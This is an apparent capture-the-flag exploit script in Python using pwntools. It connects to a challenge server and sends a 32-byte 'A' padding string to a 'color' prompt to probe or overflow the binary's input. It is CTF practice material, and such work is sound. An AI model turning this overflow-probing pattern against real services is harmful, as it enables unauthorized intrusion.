#!/usr/bin/env python3

from pwn import *

exe = ELF("color_patched")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13370

gdbscript = '''
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)


r.sendlineafter(b'color', b'A'*0x20)


r.interactive()
